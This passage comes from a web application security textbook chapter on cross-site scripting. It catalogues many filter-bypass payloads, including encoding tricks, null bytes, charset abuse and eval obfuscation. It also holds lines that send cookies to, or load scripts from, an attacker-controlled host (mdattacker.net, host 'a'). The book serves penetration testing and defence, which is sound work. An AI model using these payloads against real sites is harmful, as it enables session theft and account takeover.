you can use the javascript: protocol to introduce script directly within the 
URL attribute:
javascript:alert(1);
Because your input is being refl ected within a tag attribute, you can also inject 
an event handler, as already described.
For an attack that works against all current browsers, you can use an invalid 
image name together with an onclick event handler:
#‚Äùonclick=‚Äùjavascript:alert(1)
TIP As with other attacks, be sure to URL-encode any special characters that 
have signifi cance within the request, including & = + ; and space.
HACK STEPS
Do the following for each refl ected input identifi ed in the previous steps:
 1. Review the HTML source to identify the location(s) where your unique 
string is being reflected.
 2. If the string appears more than once, each occurrence needs to be treated 
as a separate potential vulnerability and investigated individually.
 3. Determine, from the location within the HTML of the user-controllable 
string, how you need to modify it to cause execution of arbitrary script. 
Typically, numerous different methods will be potential vehicles for an 
attack, as described later in this chapter.
 4. Test your exploit by submitting it to the application. If your crafted string 
is still returned unmodified, the application is vulnerable. Double-check 
that your syntax is correct by using a proof-of-concept script to display an 
alert dialog, and confirm that this actually appears in your browser when 
the response is rendered.
Probing Defensive Filters
Very often, you will discover that the server modifi es your initial attempted 
exploits in some way, so they do not succeed in executing your injected script. 
c12.indd 455 c12.indd 455 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 456
456 Chapter 12 n Attacking Users: Cross-Site Scripting 
If this happens, do not give up! Your next task is to determine what serverside processing is occurring that is affecting your input. There are three broad 
possibilities:
n The application (or a web application fi rewall protecting the application) 
has identifi ed an attack signature and has blocked your input.
n The application has accepted your input but has performed some kind of 
sanitization or encoding on the attack string.
n The application has truncated your attack string to a fi xed maximum length.
We will look at each scenario in turn and discuss various ways in which the 
obstacles presented by the application‚Äôs processing can be bypassed.
Beating Signature-Based Filters
In the fi rst type of fi lter, the application typically responds to your attack string 
with an entirely different response than it did for the harmless string. For 
example, it might respond with an error message, possibly even stating that a 
possible XSS attack was detected, as shown in Figure 12-8.
Figure 12-8: An error message generated by ASP.NET‚Äôs anti-XSS filters
If this occurs, the next step is to determine what characters or expressions 
within your input are triggering the fi lter. An effective approach is to remove 
different parts of your string in turn and see whether the input is still being 
blocked. Typically, this process establishes fairly quickly that a specifi c expression such as <script> is causing the request to be blocked. You then need to 
test the fi lter to establish whether any bypasses exist.
There are so many different ways to introduce script code into HTML pages 
that signature-based fi lters normally can be bypassed. You can fi nd an alternative 
c12.indd 456 c12.indd 456 8/19/2011 12:12:29 PM 8/19/2011 12:12:29 PM
Stuttard c12.indd V2 - 08/10/2011 Page 457
 Chapter 12 n Attacking Users: Cross-Site Scripting 457
means of introducing script, or you can use slightly malformed syntax that 
browsers tolerate. This section examines the numerous different methods of 
executing scripts. Then it describes a wide range of techniques that can be used 
to bypass common fi lters.
Ways of Introducing Script Code
You can introduce script code into an HTML page in four broad ways. We will 
examine these in turn, and give some unusual examples of each that may succeed in bypassing signature-based input fi lters.
NOTE Browser support for different HTML and scripting syntax varies 
widely. The behavior of individual browsers often changes with each new 
version. Any ‚Äúdefi nitive‚Äù guide to individual browsers‚Äô behavior is therefore 
liable to quickly become out of date. However, from a security perspective, 
applications need to behave in a robust way for all current and recent versions 
of popular browsers. If an XSS attack can be delivered using only one specifi c 
browser that is used by only a small percentage of users, this still constitutes 
a vulnerability that should be fi xed. All the examples given in this chapter 
work on at least one major browser at the time of writing.
For reference purposes, this chapter was written in March 2011, and the 
attacks described all work on at least one of the following:
n Internet Explorer version 8.0.7600.16385
n Firefox version 3.6.15
Script Tags
Beyond directly using a <script> tag, there are various ways in which you can 
use somewhat convoluted syntax to wrap the use of the tag, defeating some fi lters:
<object data=‚Äùdata:text/html,<script>alert(1)</script>‚Äù>
<object data=‚Äùdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==‚Äù>
<a href=‚Äùdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==‚Äù>
Click here</a>
The Base64-encoded string in the preceding examples is:
<script>alert(1)</script>
Event Handlers
Numerous event handlers can be used with various tags to cause a script to 
execute. The following are some little-known examples that execute script 
without requiring any user interaction:
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
c12.indd 457 c12.indd 457 8/19/2011 12:12:29 PM 8/19/2011 12:12:29 PM
Stuttard c12.indd V2 - 08/10/2011 Page 458
458 Chapter 12 n Attacking Users: Cross-Site Scripting 
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>
HTML5 provides a wealth of new vectors using event handlers. These include 
the use of the autofocus attribute to automatically trigger events that previously 
required user interaction:
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
It allows event handlers in closing tags:
</a onmousemove=alert(1)>
Finally, HTML5 introduces new tags with event handlers:
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
Script Pseudo-Protocols
Script pseudo-protocols can be used in various locations to execute inline script 
within an attribute that expects a URL. Here are some examples:
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
Although the javascript pseudo-protocol is most commonly given as an 
example of this technique, you can also use the vbs protocol on Internet Explorer 
browsers, as described later in this chapter.
As with event handlers, HTML5 provides some new ways of using script 
pseudo-protocols in XSS attacks:
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
The new event-source tag is of particular interest when targeting input fi lters. 
Unlike any pre-HTML5 tags, its name includes a hyphen, so using this tag may 
bypass legacy regex-based fi lters that assume tag names can contain only letters.
c12.indd 458 c12.indd 458 8/19/2011 12:12:29 PM 8/19/2011 12:12:29 PM
Stuttard c12.indd V2 - 08/10/2011 Page 459
 Chapter 12 n Attacking Users: Cross-Site Scripting 459
Dynamically Evaluated Styles
Some browsers support the use of JavaScript within dynamically evaluated 
CSS styles. The following example works on IE7 and earlier, and also on later 
versions when running in compatibility mode:
<x style=x:expression(alert(1))>
Later versions of IE removed support for the preceding syntax, on the basis 
that its only usage in practice was in XSS attacks. However, on later versions of 
IE, the following can be used to the same effect:
<x style=behavior:url(#default#time2) onbegin=alert(1)>
The Firefox browser used to allow CSS-based attacks via the moz-binding
property, but restrictions made to this feature mean that it is now less useful 
in most XSS scenarios.
Bypassing Filters: HTML
The preceding sections described numerous ways in which script code can be 
executed from within an HTML page. In many cases, you may fi nd that signaturebased fi lters can be defeated simply by switching to a different, lesser-known 
method of executing script. If this fails, you need to look at ways of obfuscating 
your attack. Typically you can do this by introducing unexpected variations 
in your syntax that the fi lter accepts and that the browser tolerates when the 
input is returned. This section examines the ways in which HTML syntax can 
be obfuscated to defeat common fi lters. The following section applies the same 
principles to JavaScript and VBScript syntax.
Signature-based fi lters designed to block XSS attacks normally employ regular 
expressions or other techniques to identify key HTML components, such as tag 
brackets, tag names, attribute names, and attribute values. For example, a fi lter 
may seek to block input containing HTML that uses specifi c tag or attribute 
names known to allow the introduction of script, or it may try to block attribute values starting with a script pseudo-protocol. Many of these fi lters can be 
bypassed by placing unusual characters at key points within the HTML in a 
way that one or more browsers tolerate.
To see this technique in action, consider the following simple exploit:
<img onerror=alert(1) src=a>
You can modify this syntax in numerous ways and still have your code execute 
on at least one browser. We will examine each of these in turn. In practice, you 
may need to combine several of these techniques in a single exploit to bypass 
more sophisticated input fi lters.
c12.indd 459 c12.indd 459 8/19/2011 12:12:29 PM 8/19/2011 12:12:29 PM
Stuttard c12.indd V2 - 08/10/2011 Page 460
460 Chapter 12 n Attacking Users: Cross-Site Scripting 
The Tag Name
Starting with the opening tag name, the most simple and na√Øve fi lters can be 
bypassed simply by varying the case of the characters used:
<iMg onerror=alert(1) src=a>
Going further, you can insert NULL bytes at any position:
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
(In these examples, [%XX] indicates the literal character with the hexadecimal 
ASCII code of XX. When submitting your attack to the application, generally you 
would use the URL-encoded form of the character. When reviewing the application‚Äôs response, you need to look for the literal decoded character being refl ected.)
TIP The NULL byte trick works on Internet Explorer anywhere within the 
HTML page. Liberal use of NULL bytes in XSS attacks often provides a quick 
way to bypass signature-based fi lters that are unaware of IE‚Äôs behavior.
Using NULL bytes has historically proven effective against web application fi rewalls (WAFs) confi gured to block requests containing known attack 
strings. Because WAFs typically are written in native code for performance 
reasons, a NULL byte terminates the string in which it appears. This prevents 
the WAF from seeing the malicious payload that comes after the NULL (see 
Chapter 16 for more details).
Going further within tag names, if you modify the example slightly, you can 
use arbitrary tag names to introduce event handlers, thereby bypassing fi lters 
that merely block specifi c named tags:
<x onclick=alert(1) src=a>Click here</x>
In some situations, you may be able to introduce new tags with various names 
but not fi nd any means of using these to directly execute code. In these situations, you may be able to deliver an attack using a technique known as ‚Äúbase tag 
hijacking.‚Äù The <base> tag is used to specify a URL that the browser should use 
to resolve any relative URLs that appear subsequently within the page. If you can 
introduce a new <base> tag, and the page performs any <script> includes after 
your refl ection point using relative URLs, you can specify a base URL to a server 
that you control. When the browser loads the scripts specifi ed in the remainder of 
the HTML page, they are loaded from the server you specifi ed, yet they are still 
executed in the context of the page that has invoked them. For example:
<base href=‚Äùhttp://mdattacker.net/badscripts/‚Äù>
...
<script src=‚Äùgoodscript.js‚Äù></script>
c12.indd 460 c12.indd 460 8/19/2011 12:12:29 PM 8/19/2011 12:12:29 PM
Stuttard c12.indd V2 - 08/10/2011 Page 461
 Chapter 12 n Attacking Users: Cross-Site Scripting 461
According to specifi cations, <base> tags should appear within the <head>
section of the HTML page. However, some browsers, including Firefox, accept 
<base> tags appearing anywhere in the page, considerably widening the scope 
of this attack.
Space Following the Tag Name
Several characters can replace the space between the tag name and the fi rst 
attribute name:
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/‚Äùonerror=alert(1) src=a>
<img/‚Äôonerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
Note that even where an attack does not require any tag attributes, you should 
always try adding some superfl uous content after the tag name, because this 
bypasses some simple fi lters:
<script/anyjunk>alert(1)</script>
Attribute Names
Within the attribute name, you can use the same NULL byte trick described 
earlier. This bypasses many simple fi lters that try to block event handlers by 
blocking attribute names starting with on:
<img o[%00]nerror=alert(1) src=a>
Attribute Delimiters
In the original example, attribute values were not delimited, requiring some 
whitespace after the attribute value to indicate that it has ended before another 
attribute can be introduced. Attributes can optionally be delimited with double 
or single quotes or, on IE, with backticks:
<img onerror=‚Äùalert(1)‚Äùsrc=a>
<img onerror=‚Äôalert(1)‚Äôsrc=a>
<img onerror=`alert(1)`src=a>
Switching around the attributes in the preceding example provides a further 
way to bypass some fi lters that check for attribute names starting with on. If 
the fi lter is unaware that backticks work as attribute delimiters, it treats the 
following example as containing a single attribute, whose name is not that of 
an event handler:
<img src=`a`onerror=alert(1)>
c12.indd 461 c12.indd 461 8/19/2011 12:12:29 PM 8/19/2011 12:12:29 PM
Stuttard c12.indd V2 - 08/10/2011 Page 462
462 Chapter 12 n Attacking Users: Cross-Site Scripting 
By combining quote-delimited attributes with unexpected characters 
following the tag name, attacks can be devised that do not use any whitespace, 
thereby bypassing some simple fi lters:
<img/onerror=‚Äùalert(1)‚Äùsrc=a>
TRY IT!
http://mdsec.net/search/69/
http://mdsec.net/search/72/
http://mdsec.net/search/75/
Attribute Values
Within attribute values themselves, you can use the NULL byte trick, and you 
also can HTML-encode characters within the value:
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
Because the browser HTML-decodes the attribute value before processing 
it further, you can use HTML encoding to obfuscate your use of script code, 
thereby evading many fi lters. For example, the following attack bypasses many 
fi lters seeking to block use of the JavaScript pseudo-protocol handler:
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
When using HTML encoding, it is worth noting that browse rs tolerate various deviations from the specifi cations, in ways that even fi lters that are aware 
of HTML encoding issues may overlook. You can use both decimal and hexadecimal format, add superfl uous leading zeros, and omit the trailing semicolon. 
The following examples all work on at least one browser:
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
Tag Brackets
In some situations, by exploiting quirky application or browser behavior, it is 
possible to use invalid tag brackets and still cause the browser to process the 
tag in the way the attack requires.
c12.indd 462 c12.indd 462 8/19/2011 12:12:29 PM 8/19/2011 12:12:29 PM
Stuttard c12.indd V2 - 08/10/2011 Page 463
 Chapter 12 n Attacking Users: Cross-Site Scripting 463
Some applications perform a superfl uous URL decode of input after their 
input fi lters have been applied, so the following input appearing in a request:
%253cimg%20onerror=alert(1)%20src=a%253e
is URL-decoded by the application server and passed to the application as:
%3cimg onerror=alert(1) src=a%3e
which does not contain any tag brackets and therefore is not blocked by the 
input fi lter. However, the application then performs a second URL decode, so 
the input becomes:
<img onerror=alert(1) src=a>
which is echoed to the user, causing the attack to execute.
As described in Chapter 2, something similar can happen when an application 
framework ‚Äútranslates‚Äù unusual Unicode characters into their nearest ASCII 
equivalents based on the similarity of their glyphs or phonetics. For example, 
the following input uses Unicode double-angle quotation marks (%u00AB and 
%u00BB) instead of tag brackets:
¬´img onerror=alert(1) src=a¬ª
The application‚Äôs input fi lters may allow this input because it does not 
contain any problematic HTML. However, if the application framework translates the quotation marks into tag characters at the point where the input is 
inserted into a response, the attack succeeds. Numerous applications have 
been found vulnerable to this kind of attack, which developers may be forgiven for overlooking.
Some input fi lters identify HTML tags by simply matching opening and closing angle brackets, extracting the contents, and comparing this to a blacklist 
of tag names. In this situation, you may be able to bypass the fi lter by using 
superfl uous brackets, which the browser tolerates:
<<script>alert(1);//<</script>
In some cases, unexpected behavior in browsers‚Äô HTML parsers can be leveraged to deliver an attack that bypasses an application‚Äôs input fi lters. For example, 
the following HTML, which uses ECMAScript for XML (E4X) syntax, does not 
contain a valid opening script tag but nevertheless executes the enclosed script 
on current versions of Firefox:
<script<{alert(1)}/></script>
c12.indd 463 c12.indd 463 8/19/2011 12:12:30 PM 8/19/2011 12:12:30 PM
Stuttard c12.indd V2 - 08/10/2011 Page 464
464 Chapter 12 n Attacking Users: Cross-Site Scripting 
TIP In several of the fi lter bypasses described, the attack results in HTML 
that is malformed but is nevertheless tolerated by the client browser. Because 
numerous quite legitimate websites contain HTML that does not strictly comply to the standards, browsers accept HTML that is deviant in all kinds of ways. 
They effectively fi x the errors behind the scenes before the page is rendered. 
Often, when you are trying to fi ne-tune an attack in an unusual situation, it 
can be helpful to view the virtual HTML that the browser constructs out of the 
server‚Äôs actual response. In Firefox, you can use the WebDeveloper tool, which 
contains a View Generated Source function that performs precisely this task.
Character Sets
In some situations, you can employ a powerful means of bypassing many types 
of fi lters by causing the application to accept a nonstandard encoding of your 
attack payload. The following examples show some representations of the string 
<script>alert(document.cookie)</script> in alternative character sets:
UTF-7
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
US-ASCII
BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¬ºscript¬æalert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¬º/
73 63 72 69 70 74 BE ; script¬æ
UTF-16
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; √ø√æ<.s.c.r.i.p.t.
3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.
These encoded strings will bypass many common anti-XSS fi lters. The challenge 
of delivering a successful attack is to make the browser interpret the response 
using the character set required. If you control either the HTTP Content-Type
header or its corresponding HTML metatag, you may be able to use a nonstandard character set to bypass the application‚Äôs fi lters and cause the browser to 
interpret your payload in the way you require. In some applications, a charset
parameter is actually submitted in certain requests, enabling you to directly 
set the character set used in the application‚Äôs response.
If the application by default uses a multibyte character set, such as Shift-JIS, 
this may enable you to bypass certain input fi lters by submitting characters that 
have special signifi cance in the character set being used. For example, suppose 
two pieces of user input are returned in the application‚Äôs response:
<img src=‚Äùimage.gif‚Äù alt=‚Äù[input1]‚Äù /> ... [input2]
c12.indd 464 c12.indd 464 8/19/2011 12:12:30 PM 8/19/2011 12:12:30 PM
Stuttard c12.indd V2 - 08/10/2011 Page 465
 Chapter 12 n Attacking Users: Cross-Site Scripting 465
For input1, the application blocks input containing quotation marks to prevent 
an attacker from terminating the quoted attribute. For input2, the application 
blocks input containing angle brackets to prevent an attacker from using any 
HTML tags. This appears to be robust, but an attacker may be able to deliver 
an exploit using the following two inputs:
input1: [%f0]
input2: ‚Äúonload=alert(1);
In the Shift-JIS character set, various raw byte values, including 0xf0, are used 
to signal a 2-byte character that is composed of that byte and the following byte. 
Hence, when the browser processes input1, the quotation mark following the 
0xf0 byte is interpreted as part of a 2-byte character and therefore does not delimit 
the attribute value. The HTML parser continues until it reaches the quotation 
mark supplied in input2, which terminates the attribute, allowing the attacker‚Äôs 
supplied event handler to be interpreted as an additional tag attribute:
<img src=‚Äùimage.gif‚Äù alt=‚Äù? /> ... ‚Äúonload=alert(1);
When exploits of this kind were identifi ed in the widely used multibyte 
character set UTF-8, browser vendors responded with a fi x that prevented the 
attack from succeeding. However, currently the same attack still works on some 
browsers against several other lesser-used multibyte character sets, including 
Shift-JIS, EUC-JP, and BIG5.
Bypassing Filters: Script Code
In some situations, you will fi nd a way to manipulate refl ected input to introduce 
a script context into the application‚Äôs response. However, various other obstacles 
may prevent you from executing the code you need to deliver an actual attack. 
The kind of fi lters you may encounter here typically seek to block the use of 
certain JavaScript keywords and other expressions. They may also block useful 
characters such as quotes, brackets, and dots.
As with the obfuscation of attacks using HTML, you can use numerous 
techniques to modify your desired script code to bypass common input fi lters.
Using JavaScript Escaping
JavaScript allows various kinds of character escaping, which you can use to 
avoid including required expressions in their literal form.
Unicode escapes can be used to represent characters within JavaScript keywords, allowing you to bypass many kinds of fi lters:
<script>a\u006cert(1);</script>
If you can make use of the eval command, possibly by using the preceding 
technique to escape some of its characters, you can execute other commands 
by passing them to the eval command in string form. This allows you to 
c12.indd 465 c12.indd 465 8/19/2011 12:12:30 PM 8/19/2011 12:12:30 PM
Stuttard c12.indd V2 - 08/10/2011 Page 466
466 Chapter 12 n Attacking Users: Cross-Site Scripting 
use various string manipulation techniques to hide the command you are 
executing.
Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, 
and octal escapes:
<script>eval(‚Äòa\u006cert(1)‚Äô);</script>
<script>eval(‚Äòa\x6cert(1)‚Äô);</script>
<script>eval(‚Äòa\154ert(1)‚Äô);</script>
Furthermore, superfl uous escape characters within strings are ignored:
<script>eval(‚Äòa\l\ert\(1\)‚Äô);</script>
Dynamically Constructing Strings
You can use other techniques to dynamically construct strings to use in your attacks:
<script>eval(‚Äòal‚Äô+‚Äôert(1)‚Äô);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob(‚ÄòamF2YXNjcmlwdDphbGVydCgxKQ‚Äô));</script>
The fi nal example, which works on Firefox, allows you to decode a Base64-
encoded command before passing it to eval.
Alternatives to eval
If direct calls to the eval command are not possible, you have other ways to 
execute commands in string form:
<script>‚Äôalert(1)‚Äô.replace(/.+/,eval)</script>
<script>function::[‚Äòalert‚Äô](1)</script>
Alternatives to Dots
If the dot character is being blocked, you can use other methods to perform 
dereferences:
<script>alert(document[‚Äòcookie‚Äô])</script>
<script>with(document)alert(cookie)</script>
Combining Multiple Techniques
The techniques described so far can often be used in combination to apply several layers of obfuscation to your attack. Furthermore, in cases where JavaScript 
is being used within an HTML tag attribute (via an event handler, scripting 
pseudo-protocol, or dynamically evaluated style), you can combine these techniques with HTML encoding. The browser HTML-decodes the tag attribute 
value before the JavaScript it contains is interpreted. In the following example, 
the ‚Äúe‚Äù character in ‚Äúalert‚Äù has been escaped using Unicode escaping, and the 
backslash used in the Unicode escape has been HTML-encoded:
<img onerror=eval(‚Äòal&#x5c;u0065rt(1)‚Äô) src=a>
c12.indd 466 c12.indd 466 8/19/2011 12:12:30 PM 8/19/2011 12:12:30 PM
Stuttard c12.indd V2 - 08/10/2011 Page 467
 Chapter 12 n Attacking Users: Cross-Site Scripting 467
Of course, any of the other characters within the onerror attribute value could 
also be HTML-encoded to further hide the attack:
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&
#x29;&#x27;&#x29; src=a>
This technique enables you to bypass many fi lters on JavaScript code, because 
you can avoid using any JavaScript keywords or other syntax such as quotes, 
periods, and brackets.
Using VBScript
Although common examples of XSS exploits typically focus on JavaScript, on 
Internet Explorer you also can use the VBScript language. It has different syntax 
and other properties that you may be able to leverage to bypass many input 
fi lters that were designed with only JavaScript in mind.
You can introduce VBScript code in various ways:
<script language=vbs>MsgBox 1</script>
<img onerror=‚Äùvbs:MsgBox 1‚Äù src=a>
<img onerror=MsgBox+1 language=vbs src=a>
In all cases, you can use vbscript instead of vbs to specify the language. In 
the last example, note the use of MsgBox+1 to avoid the use of whitespace, thereby 
avoiding the need for quotes around the attribute value. This works because 
+1 effectively adds the number 1 to nothing, so the expression evaluates to 1,
which is passed to the MsgBox function.
It is noteworthy that in VBScript, some functions can be called without brackets, as shown in the preceding examples. This may allow you to bypass some 
fi lters that assume that script code must employ brackets to access any functions.
Furthermore, unlike JavaScript, the VBScript language is not case-sensitive, 
so you can use upper and lowercase characters in all keywords and function 
names. This behavior is most useful when the application function you are 
attacking modifi es the case of your input, such as by converting it to uppercase. 
Although this may have been done for reasons of functionality rather than security, it may frustrate XSS exploits using JavaScript code, which fails to execute 
when converted to uppercase. In contrast, exploits using VBScript still work:
<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
<IMG ONERROR=‚ÄùVBS:MSGBOX 1‚Äù SRC=A>
Combining VBScript and JavaScript
To add further layers of complexity to your attack, and circumvent some fi lters, 
you can call into VBScript from JavaScript, and vice versa:
<script>execScript(‚ÄúMsgBox 1‚Äù,‚Äùvbscript‚Äù);</script>
<script language=vbs>execScript(‚Äúalert(1)‚Äù)</script>
c12.indd 467 c12.indd 467 8/19/2011 12:12:30 PM 8/19/2011 12:12:30 PM
Stuttard c12.indd V2 - 08/10/2011 Page 468
468 Chapter 12 n Attacking Users: Cross-Site Scripting 
You can even nest these calls and ping-pong between the languages as required:
<script>execScript(‚ÄòexecScript 
‚Äúalert(1)‚Äù,‚Äùjavascript‚Äù‚Äô,‚Äùvbscript‚Äù);</script>
As mentioned, VBScript is case-insensitive, allowing you to execute code in 
contexts where your input is converted to uppercase. If you really want to call 
JavaScript functions in these situations, you can use string manipulation functions within VBScript to construct a command with the required case and then 
execute this using JavaScript:
<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(‚ÄúALERT(1)‚Äù)) </SCRIPT>
<IMG ONERROR=‚ÄùVBS:EXECSCRIPT LCASE(‚ÄòALERT(1)‚Äô)‚Äù SRC=A>
Using Encoded Scripts
On Internet Explorer, you can use Microsoft‚Äôs custom script-encoding algorithm 
to hide the contents of scripts and potentially bypass some input fi lters:
<img onerror=‚ÄùVBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@‚Äù src=a>
<img language=‚ÄùJScript.Encode‚Äù onerror=‚Äù#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@‚Äù 
src=a>
This encoding was originally designed to prevent users from inspecting 
client-side scripts easily by viewing the source code for the HTML page. It has 
since been reverse-engineered, and numerous tools and websites will let you 
decode encoded scripts. You can encode your own scripts for use in attacks via 
Microsoft‚Äôs command-line utility srcenc in older versions of Windows.
Beating Sanitization
Of all the obstacles that you may encounter when attempting to exploit potential XSS conditions, sanitizing fi lters are probably the most common. Here, the 
application performs some kind of sanitization or encoding on your attack string 
that renders it harmless, preventing it from causing the execution of JavaScript.
The most prevalent manifestation of data sanitization occurs when the application HTML-encodes certain key characters that are necessary to deliver an 
attack (so < becomes &lt; and > becomes &gt;). In other cases, the application 
may remove certain characters or expressions in an attempt to cleanse your 
input of malicious content.
When you encounter this defense, your fi rst step is to determine precisely 
which characters and expressions are being sanitized, and whether it is still 
possible to carry out an attack without directly employing these characters 
and expressions. For example, if your data is being inserted directly into an 
existing script, you may not need to employ any HTML tag characters. Or, if 
the application is removing <script> tags from your input, you may be able 
c12.indd 468 c12.indd 468 8/19/2011 12:12:30 PM 8/19/2011 12:12:30 PM
Stuttard c12.indd V2 - 08/10/2011 Page 469
 Chapter 12 n Attacking Users: Cross-Site Scripting 469
to use a different tag with a suitable event handler. Here, you should consider 
all the techniques already discussed for dealing with signature-based fi lters, 
including using layers of encoding, NULL bytes, nonstandard syntax, and 
obfuscated script code. By modifying your input in the various ways described, 
you may be able to devise an attack that does not contain any of the characters 
or expressions that the fi lter is sanitizing and therefore successfully bypass it.
If it appears impossible to perform an attack without using input that is being 
sanitized, you need to test the effectiveness of the sanitizing fi lter to establish 
whether any bypasses exist.
As described in Chapter 2, several mistakes often appear in sanitizing fi lters. 
Some string manipulation APIs contain methods to replace only the fi rst instance 
of a matched expression, and these are sometimes easily confused with methods 
that replace all instances. So if <script> is being stripped from your input, you 
should try the following to check whether all instances are being removed:
<script><script>alert(1)</script>
In this situation, you should also check whether the sanitization is being 
performed recursively:
<scr<script>ipt>alert(1)</script>
Furthermore, if the fi lter performs several sanitizing steps on your input, you 
should check whether the order or interplay between these can be exploited. 
For example, if the fi lter strips <script> recursively and then strips <object>
recursively, the following attack may succeed:
<scr<object>ipt>alert(1)</script>
When you are injecting into a quoted string in an existing script, it is common to fi nd that the application sanitizes your input by placing the backslash 
character before any quotation mark characters you submit. This escapes your 
quotation marks, preventing you from terminating the string and injecting 
arbitrary script. In this situation, you should always verify whether the backslash character itself is being escaped. If not, a simple fi lter bypass is possible. 
For example, if you control the value foo in:
var a = ‚Äòfoo‚Äô;
you can inject:
foo\‚Äô; alert(1);//
This results in the following response, in which your injected script executes. Note the use of the JavaScript comment character // to comment out the 
c12.indd 469 c12.indd 469 8/19/2011 12:12:31 PM 8/19/2011 12:12:31 PM
Stuttard c12.indd V2 - 08/10/2011 Page 470
470 Chapter 12 n Attacking Users: Cross-Site Scripting 
remainder of the line, thus preventing a syntax error caused by the application‚Äôs 
own string delimiter:
var a = ‚Äòfoo\\‚Äô; alert(1);//‚Äô;
Here, if you fi nd that the backslash character is also being properly escaped, 
but angle brackets are returned unsanitized, you can use the following attack:
</script><script>alert(1)</script> 
This effectively abandons the application‚Äôs original script and injects a new 
one immediately after it. The attack works because browsers‚Äô parsing of HTML 
tags takes precedence over their parsing of embedded JavaScript:
<script>var a = ‚Äò</script><script>alert(1)</script>
Although the original script now contains a syntax error, this does not matter, 
because the browser moves on and executes your injected script regardless of 
the error in the original script.
TRY IT!
http://mdsec.net/search/48/
http://mdsec.net/search/52/
TIP If you can inject into a script, but you cannot use quotation marks because 
these are being escaped, you can use the String.fromCharCode technique to 
construct strings without the need for delimiters, as described previously.
In cases where the script you are injecting into resides within an event handler, 
rather than a full script block, you may be able to HTML-encode your quotation 
marks to bypass the application‚Äôs sanitization and break out of the string you 
control. For example, if you control the value foo in:
<a href=‚Äù#‚Äù onclick=‚Äùvar a = ‚Äòfoo‚Äô; ...
and the application is properly escaping both quotation marks and backslashes 
in your input, the following attack may succeed:
foo&apos;; alert(1);//
This results in the following response, and because some browsers perform 
an HTML decode before the event handler is executed as JavaScript, the attack 
succeeds:
<a href=‚Äù#‚Äù onclick=‚Äùvar a = ‚Äòfoo&apos;; alert(1);//‚Äô; ...
c12.indd 470 c12.indd 470 8/19/2011 12:12:31 PM 8/19/2011 12:12:31 PM
Stuttard c12.indd V2 - 08/10/2011 Page 471
 Chapter 12 n Attacking Users: Cross-Site Scripting 471
The fact that event handlers are HTML-decoded before being executed as 
JavaScript represents an important caveat to the standard recommendation 
of HTML-encoding user input to prevent XSS attacks. In this syntactic context, 
HTML encoding is not necessarily an obstacle to an attack. The attacker himself 
may even use it to circumvent other defenses.
Beating Length Limits
When the application truncates your input to a fi xed maximum length, you 
have three possible approaches to creating a working exploit.
The fi rst, rather obvious method is to attempt to shorten your attack payload 
by using JavaScript APIs with the shortest possible length and removing characters that are usually included but are strictly unnecessary. For example, if you 
are injecting into an existing script, the following 28-byte command transmits 
the user‚Äôs cookies to the server with hostname a:
open(‚Äú//a/‚Äù+document.cookie)
Alternatively, if you are injecting straight into HTML, the following 30-byte 
tag loads and executes a script from the server with hostname a:
<script src=http://a></script>
On the Internet, these examples would obviously need to be expanded to 
contain a valid domain name or IP address. However, on an internal corporate 
network, it may actually be possible to use a machine with the WINS name a
to host the recipient server.
TIP You can use Dean Edwards‚Äô JavaScript packer to shrink a given script as 
much as possible by eliminating unnecessary whitespace. This utility also converts scripts to a single line for easy insertion into a request parameter:
http://dean.edwards.name/packer/
The second, potentially more powerful technique for beating length limits 
is to span an attack payload across multiple different locations where usercontrollable input is inserted into the same returned page. For example, consider 
the following URL:
https://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal
